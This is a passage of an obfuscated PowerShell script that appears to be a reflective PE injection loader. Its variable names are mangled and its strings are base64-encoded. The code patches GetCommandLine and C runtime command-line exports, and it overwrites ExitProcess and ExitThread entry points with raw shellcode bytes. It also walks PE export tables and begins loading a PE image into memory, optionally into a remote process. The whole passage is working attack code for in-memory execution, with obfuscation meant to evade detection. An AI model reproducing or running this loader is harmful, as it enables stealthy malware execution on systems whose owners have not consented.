			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${/=====\/==\/=\/\_} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${/=====\/==\/=\/\_} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${_/=\/\/\__/==\/=\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/=\_/\/\__/=\__})
		${___/\_/\/\_/\_/=\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/=\_/\/\__/=\__})
		[IntPtr]${/=\____/===\_/=\/} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${/=====\/==\/=\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/====\/===\__/=\/} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${/=====\/==\/=\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${/=\____/===\_/=\/} -eq [IntPtr]::Zero -or ${/====\/===\__/=\/} -eq [IntPtr]::Zero)
		{
			throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAcAB0AHIAIABuAHUAbABsAC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAQQA6ACAAJAB7AC8APQBcAF8AXwBfAF8ALwA9AD0APQBcAF8ALwA9AFwALwB9AC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAVwA6ACAAJAB7AC8APQA9AD0APQBcAC8APQA9AD0AXABfAF8ALwA9AFwALwB9AA==')))
		}
		[Byte[]]${__/\/=\/=\__/=\/\} = @()
		if (${_/=\/\/==\_/\_/==} -eq 8)
		{
			${__/\/=\/=\__/=\/\} += 0x48	
		}
		${__/\/=\/=\__/=\/\} += 0xb8
		[Byte[]]${___/==\__/=\___/\} = @(0xc3)
		${_/\/\_/==\_/=\_/=} = ${__/\/=\/=\__/=\/\}.Length + ${_/=\/\/==\_/\_/==} + ${___/==\__/=\___/\}.Length
		${____/=\_/=\______} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/==\_/=\_/=})
		${_/\/=\/\/\_/\/\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/==\_/=\_/=})
		${_/=\/\/\/\____/\/=}.memcpy.Invoke(${____/=\_/=\______}, ${/=\____/===\_/=\/}, [UInt64]${_/\/\_/==\_/=\_/=}) | Out-Null
		${_/=\/\/\/\____/\/=}.memcpy.Invoke(${_/\/=\/\/\_/\/\/\}, ${/====\/===\__/=\/}, [UInt64]${_/\/\_/==\_/=\_/=}) | Out-Null
		${___/==\_/\_/==\_/} += ,(${/=\____/===\_/=\/}, ${____/=\_/=\______}, ${_/\/\_/==\_/=\_/=})
		${___/==\_/\_/==\_/} += ,(${/====\/===\__/=\/}, ${_/\/=\/\/\_/\/\/\}, ${_/\/\_/==\_/=\_/=})
		[UInt32]${__/====\/===\/\__} = 0
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/=\____/===\_/=\/}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32](${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE), [Ref]${__/====\/===\/\__})
		if (${______/\/\_/=\_/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${______/==\__/==\/} = ${/=\____/===\_/=\/}
		______/\____/\/=\/ -___/=====\/====\/\ ${__/\/=\/=\__/=\/\} -___/==\__/\_/=\__/ ${______/==\__/==\/}
		${______/==\__/==\/} = _/===\/==\/======\ ${______/==\__/==\/} (${__/\/=\/=\__/=\/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\_/\/\_/\_/=\}, ${______/==\__/==\/}, $false)
		${______/==\__/==\/} = _/===\/==\/======\ ${______/==\__/==\/} ${_/=\/\/==\_/\_/==}
		______/\____/\/=\/ -___/=====\/====\/\ ${___/==\__/=\___/\} -___/==\__/\_/=\__/ ${______/==\__/==\/}
		${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/=\____/===\_/=\/}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32]${__/====\/===\/\__}, [Ref]${__/====\/===\/\__}) | Out-Null
		[UInt32]${__/====\/===\/\__} = 0
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/====\/===\__/=\/}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32](${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE), [Ref]${__/====\/===\/\__})
		if (${______/\/\_/=\_/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/=\_/\/=\/\/\_/\} = ${/====\/===\__/=\/}
		______/\____/\/=\/ -___/=====\/====\/\ ${__/\/=\/=\__/=\/\} -___/==\__/\_/=\__/ ${_/=\_/\/=\/\/\_/\}
		${_/=\_/\/=\/\/\_/\} = _/===\/==\/======\ ${_/=\_/\/=\/\/\_/\} (${__/\/=\/=\__/=\/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/\/\__/==\/=\}, ${_/=\_/\/=\/\/\_/\}, $false)
		${_/=\_/\/=\/\/\_/\} = _/===\/==\/======\ ${_/=\_/\/=\/\/\_/\} ${_/=\/\/==\_/\_/==}
		______/\____/\/=\/ -___/=====\/====\/\ ${___/==\__/=\___/\} -___/==\__/\_/=\__/ ${_/=\_/\/=\/\/\_/\}
		${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/====\/===\__/=\/}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32]${__/====\/===\/\__}, [Ref]${__/====\/===\/\__}) | Out-Null
		${/\______/\_/\/\/\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${_/===\/\/\/\/\___} in ${/\______/\_/\/\/\})
		{
			[IntPtr]${/=\/\/\_/=\/\/\/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke(${_/===\/\/\/\/\___})
			if (${/=\/\/\_/=\/\/\/=} -ne [IntPtr]::Zero)
			{
				[IntPtr]${__/\/===\_/\__/==} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${/=\/\/\_/=\/\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${/=\/\_/\/\__/==\/} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${/=\/\/\_/=\/\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${__/\/===\_/\__/==} -eq [IntPtr]::Zero -or ${/=\/\_/\/\__/==\/} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${/=\_/==\__/=\/=\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/=\_/\/\__/=\__})
				${/==\_/\_/====\/==} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/=\_/\/\__/=\__})
				${__/=\/\/\_/\/===\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\_/\/\__/==\/}, [Type][IntPtr])
				${/\______/\/=\____} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/===\_/\__/==}, [Type][IntPtr])
				${_/=\_/\_/=\_/\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/\/==\_/\_/==})
				${_/=\/\________/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/\/==\_/\_/==})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/=\/\/\_/\/===\}, ${_/=\_/\_/=\_/\/==}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/\______/\/=\____}, ${_/=\/\________/=\}, $false)
				${___/==\_/\_/==\_/} += ,(${/=\/\_/\/\__/==\/}, ${_/=\_/\_/=\_/\/==}, ${_/=\/\/==\_/\_/==})
				${___/==\_/\_/==\_/} += ,(${__/\/===\_/\__/==}, ${_/=\/\________/=\}, ${_/=\/\/==\_/\_/==})
				${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/=\/\_/\/\__/==\/}, [UInt32]${_/=\/\/==\_/\_/==}, [UInt32](${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE), [Ref]${__/====\/===\/\__})
				if (${______/\/\_/=\_/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\_/==\__/=\/=\_}, ${/=\/\_/\/\__/==\/}, $false)
				${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/=\/\_/\/\__/==\/}, [UInt32]${_/=\/\/==\_/\_/==}, [UInt32](${__/====\/===\/\__}), [Ref]${__/====\/===\/\__}) | Out-Null
				${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${__/\/===\_/\__/==}, [UInt32]${_/=\/\/==\_/\_/==}, [UInt32](${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE), [Ref]${__/====\/===\/\__})
				if (${______/\/\_/=\_/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\_/\_/====\/==}, ${__/\/===\_/\__/==}, $false)
				${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${__/\/===\_/\__/==}, [UInt32]${_/=\/\/==\_/\_/==}, [UInt32](${__/====\/===\/\__}), [Ref]${__/====\/===\/\__}) | Out-Null
			}
		}
		${___/==\_/\_/==\_/} = @()
		${/==\/===\__/=\___} = @() 
		[IntPtr]${_/\_/====\/===\/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${_/\_/====\/===\/=} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${/=\_/\_/====\/\_/} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_/\_/====\/===\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${/=\_/\_/====\/\_/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/==\/===\__/=\___} += ${/=\_/\_/====\/\_/}
		[IntPtr]${_/\__/====\__/\/\} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_____/==\/\_/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${_/\__/====\__/\/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/==\/===\__/=\___} += ${_/\__/====\__/\/\}
		[UInt32]${__/====\/===\/\__} = 0
		foreach (${/======\/=\___/\_} in ${/==\/===\__/=\___})
		{
			${_/\/\/\_/=\_/\/\_} = ${/======\/=\___/\_}
			[Byte[]]${__/\/=\/=\__/=\/\} = @(0xbb)
			[Byte[]]${___/==\__/=\___/\} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${_/=\/\/==\_/\_/==} -eq 8)
			{
				[Byte[]]${__/\/=\/=\__/=\/\} = @(0x48, 0xbb)
				[Byte[]]${___/==\__/=\___/\} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${/==\/\/\_/\__/===} = @(0xff, 0xd3)
			${_/\/\_/==\_/=\_/=} = ${__/\/=\/=\__/=\/\}.Length + ${_/=\/\/==\_/\_/==} + ${___/==\__/=\___/\}.Length + ${_/=\/\/==\_/\_/==} + ${/==\/\/\_/\__/===}.Length
			[IntPtr]${/=\__/\__/\_/\_/\} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_____/==\/\_/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${/=\__/\__/\_/\_/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/======\/=\___/\_}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32]${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE, [Ref]${__/====\/===\/\__})
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${/=\__/\__/====\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/==\_/=\_/=})
			${_/=\/\/\/\____/\/=}.memcpy.Invoke(${/=\__/\__/====\/\}, ${/======\/=\___/\_}, [UInt64]${_/\/\_/==\_/=\_/=}) | Out-Null
			${___/==\_/\_/==\_/} += ,(${/======\/=\___/\_}, ${/=\__/\__/====\/\}, ${_/\/\_/==\_/=\_/=})
			______/\____/\/=\/ -___/=====\/====\/\ ${__/\/=\/=\__/=\/\} -___/==\__/\_/=\__/ ${_/\/\/\_/=\_/\/\_}
			${_/\/\/\_/=\_/\/\_} = _/===\/==\/======\ ${_/\/\/\_/=\_/\/\_} (${__/\/=\/=\__/=\/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/====\_/\__/\__/}, ${_/\/\/\_/=\_/\/\_}, $false)
			${_/\/\/\_/=\_/\/\_} = _/===\/==\/======\ ${_/\/\/\_/=\_/\/\_} ${_/=\/\/==\_/\_/==}
			______/\____/\/=\/ -___/=====\/====\/\ ${___/==\__/=\___/\} -___/==\__/\_/=\__/ ${_/\/\/\_/=\_/\/\_}
			${_/\/\/\_/=\_/\/\_} = _/===\/==\/======\ ${_/\/\/\_/=\_/\/\_} (${___/==\__/=\___/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\__/\__/\_/\_/\}, ${_/\/\/\_/=\_/\/\_}, $false)
			${_/\/\/\_/=\_/\/\_} = _/===\/==\/======\ ${_/\/\/\_/=\_/\/\_} ${_/=\/\/==\_/\_/==}
			______/\____/\/=\/ -___/=====\/====\/\ ${/==\/\/\_/\__/===} -___/==\__/\_/=\__/ ${_/\/\/\_/=\_/\/\_}
			${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${/======\/=\___/\_}, [UInt32]${_/\/\_/==\_/=\_/=}, [UInt32]${__/====\/===\/\__}, [Ref]${__/====\/===\/\__}) | Out-Null
		}
		echo ${___/==\_/\_/==\_/}
	}
	Function ___/=\/====\__/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${____/==\/\__/====\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/}
		)
		[UInt32]${__/====\/===\/\__} = 0
		foreach (${__/==\/\_/=\/====} in ${____/==\/\__/====\})
		{
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${__/==\/\_/=\/====}[0], [UInt32]${__/==\/\_/=\/====}[2], [UInt32]${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE, [Ref]${__/====\/===\/\__})
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${_/=\/\/\/\____/\/=}.memcpy.Invoke(${__/==\/\_/=\/====}[0], ${__/==\/\_/=\/====}[1], [UInt64]${__/==\/\_/=\/====}[2]) | Out-Null
			${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${__/==\/\_/=\/====}[0], [UInt32]${__/==\/\_/=\/====}[2], [UInt32]${__/====\/===\/\__}, [Ref]${__/====\/===\/\__}) | Out-Null
		}
	}
	Function __/\/=\/\_______/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\_/\/======\},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${______/\__/=\/\_/\}
		)
		${_____/=\_____/\__/} = ___/\/=====\__/=\_
		${_____/\__/\/\/\/\/} = __/\_/=\_/\/\__/=\
		${_/=\/====\/\/==\_/} = _/=\____/=\/\_/\__ -_/====\_/\/======\ ${_/====\_/\/======\} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
		if (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${___/\_/\____/=\_/} = _/===\/==\/======\ (${_/====\_/\/======\}) (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${/=\/\/\/\/=\/\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\_/\____/=\_/}, [Type]${_____/=\_____/\__/}.IMAGE_EXPORT_DIRECTORY)
		for (${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${/=\/\/\/\/=\/\/\/}.NumberOfNames; ${__/\_/=\/\/\_/=\_}++)
		{
			${/=======\/\___/==} = _/===\/==\/======\ (${_/====\_/\/======\}) (${/=\/\/\/\/=\/\/\/}.AddressOfNames + (${__/\_/=\/\/\_/=\_} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${/\____/=\/=\/\__/} = _/===\/==\/======\ (${_/====\_/\/======\}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=======\/\___/==}, [Type][UInt32]))
			${/==\/=\_/=\_/\_/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/\____/=\/=\/\__/})
			if (${/==\/=\_/=\_/\_/=} -ceq ${______/\__/=\/\_/\})
			{
				${_/=\/\_/==\_/==\/} = _/===\/==\/======\ (${_/====\_/\/======\}) (${/=\/\/\/\/=\/\/\/}.AddressOfNameOrdinals + (${__/\_/=\/\/\_/=\_} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${__/\/=\_/\_/=\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\_/==\_/==\/}, [Type][UInt16])
				${/=\/\_/=\___/\_/\} = _/===\/==\/======\ (${_/====\_/\/======\}) (${/=\/\/\/\/=\/\/\/}.AddressOfFunctions + (${__/\/=\_/\_/=\/\/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${__/\/\_______/\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/\_/=\___/\_/\}, [Type][UInt32])
				return _/===\/==\/======\ (${_/====\_/\/======\}) (${__/\/\_______/\__})
			}
		}
		return [IntPtr]::Zero
	}
	Function _/=\_/\/==\/===\/=
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${___/==\_/\___/\/=\},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${__/\/\/=\_/\______},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${__/=\_/\___/\_/\/=}
		)
		${_/=\/\/==\_/\_/==} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${_____/\__/\/\/\/\/} = __/\_/=\_/\/\__/=\
		${_/=\/\/\/\____/\/=} = __/\____/\/==\___/
		${_____/=\_____/\__/} = ___/\/=====\__/=\_
		${/=\_/=\/\_____/==} = $false
		if ((${__/=\_/\___/\_/\/=} -ne $null) -and (${__/=\_/\___/\_/\/=} -ne [IntPtr]::Zero))
		{
			${/=\_/=\/\_____/==} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${_/=\/====\/\/==\_/} = _/====\____/===\_/ -___/==\_/\___/\/=\ ${___/==\_/\___/\/=\} -_____/=\_____/\__/ ${_____/=\_____/\__/}
		${_/=\/==\/====\_/\/} = ${_/=\/====\/\/==\_/}.OriginalImageBase
		${__/\/\/\/\_/=\/\_} = $true
		if (([Int] ${_/=\/====\/\/==\_/}.DllCharacteristics -band ${_____/\__/\/\/\/\/}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne ${_____/\__/\/\/\/\/}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${__/\/\/\/\_/=\/\_} = $false
		}
		${_/====\_/\/=\_/\_} = $true
		if (${/=\_/=\/\_____/==} -eq $true)
		{
			${_____/==\/\_/\_/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_____/==\/\_/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${/===\/==\_/\/\/\_} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${_/==\/\/\/\/=\_/\} = $false
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.IsWow64Process.Invoke(${__/=\_/\___/\_/\/=}, [Ref]${_/==\/\/\/\/=\_/\})
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${_/==\/\/\/\/=\_/\} -eq $true) -or ((${_/==\/\/\/\/=\_/\} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${_/====\_/\/=\_/\_} = $false
			}
			${/\_____/=\_/===\/} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${/\_____/=\_/===\/} = $false
			}
			if (${/\_____/=\_/===\/} -ne ${_/====\_/\/=\_/\_})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${_/====\_/\/=\_/\_} = $false
			}
		}
		if (${_/====\_/\/=\_/\_} -ne ${_/=\/====\/\/==\_/}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${/===\_/\/\/=\/===} = [IntPtr]::Zero
